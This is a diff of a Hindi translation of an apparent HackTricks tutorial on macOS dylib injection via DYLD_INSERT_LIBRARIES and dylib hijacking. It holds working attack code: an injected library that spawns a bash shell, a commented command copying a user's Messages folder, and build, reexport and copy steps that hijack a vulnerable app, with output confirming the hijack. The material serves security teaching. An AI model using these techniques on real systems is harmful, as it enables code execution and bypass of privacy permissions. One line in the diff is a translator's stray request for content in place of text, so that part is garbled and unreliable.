@@ -4,7 +4,7 @@
 
 ## DYLD_INSERT_LIBRARIES का Basic example
 
-**Inject करने के लिए Library** ताकि shell execute हो:
+**shell execute करने के लिए inject की जाने वाली Library:**
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -22,7 +22,7 @@ execv("/bin/bash", 0);
 //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-Attack करने वाला Binary:
+हमले के लिए Binary:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -37,9 +37,9 @@ Injection:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
-## Dyld Hijacking Example
+## Dyld Hijacking का उदाहरण
 
-लक्षित vulnerable binary `/Applications/VulnDyld.app/Contents/Resources/lib/binary` है।
+The targeted vulnerable binary is `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {{#tabs}}
 {{#tab name="entitlements"}}
@@ -66,7 +66,7 @@ path @loader_path/../lib2 (offset 12)
 
 {{#tab name="@rpath"}}
 ```bash
-# Check librareis loaded using @rapth and the used versions
+# Check libraries loaded using @rpath and the versions used
 otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
 name @rpath/lib.dylib (offset 24)
 time stamp 2 Thu Jan  1 01:00:02 1970
@@ -77,7 +77,7 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-पिछली जानकारी से हमें पता चलता है कि यह **loaded libraries के signature की जाँच नहीं कर रहा है** और यह **यहाँ से एक library load करने का प्रयास कर रहा है**:
+पिछली जानकारी से हमें पता है कि यह **loaded libraries का signature check नहीं कर रहा है** और यह **यहाँ से एक library load करने का प्रयास कर रहा है**:
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-तो, इसे hijack करना संभव है! ऐसी library बनाएँ जो **कुछ arbitrary code execute करे और उसे reexport करके legit library जैसी ही functionalities export करे**। और इसे expected versions के साथ compile करना याद रखें:
+तो, इसे hijack करना संभव है! ऐसी library बनाएं जो **कुछ arbitrary code execute करे और legit library जैसी ही functionalities export करे**, उसे reexport करके। और इसे अपेक्षित versions के साथ compile करना याद रखें:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -99,12 +99,12 @@ void custom(int argc, const char **argv) {
 NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-कृपया वह English content साझा करें जिसे Hindi में translate करना है।
+Please provide the Markdown content to translate.
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-library में बनाया गया reexport path loader के सापेक्ष है, इसे export की जाने वाली library के absolute path में बदलें:
+Library में बनाया गया reexport path loader के सापेक्ष है; इसे export की जाने वाली library के absolute path में बदलते हैं:
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
@@ -125,7 +125,7 @@ name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Con
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
-और binary को **execute** करें और जांचें कि **library was loaded** है:
+और **execute** करें और जांचें कि **library was loaded**:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
@@ -133,16 +133,15 @@ cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 </code></pre>
 
 > [!TIP]
-> इस vulnerability का abuse करके Telegram की camera permissions का abuse करने के तरीके पर एक अच्छा writeup [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup> पर पाया जा सकता है।
+> इस vulnerability का abuse करके Telegram की camera permissions का abuse कैसे किया जा सकता है, इस पर एक अच्छा writeup [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) पर मिल सकता है। <sup>[[1]](#references)</sup>
 
-## बड़े स्तर पर
+## बड़े पैमाने पर
 
-यदि आप unexpected binaries में libraries inject करने का प्रयास करना चाहते हैं, तो आप event messages को check करके पता लगा सकते हैं कि library किसी process के अंदर कब load होती है (इस स्थिति में `printf` और `/bin/bash` execution को हटा दें)।
+यदि आप unexpected binaries में libraries inject करने का प्रयास कर रहे हैं, तो आप event messages को check करके पता लगा सकते हैं कि library किसी process के अंदर कब load होती है (इस स्थिति में `printf` और `/bin/bash` execution को हटा दें)।
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
-## संदर्भ
+## References
 
-- [1] [CVE-2023-26818 - macOS में Telegram के साथ TCC को bypass करना](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
-
+- [1] [CVE-2023-26818 - macOS में Telegram के साथ TCC को Bypass करना](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 {{#include ../../../../banners/hacktricks-training.md}}
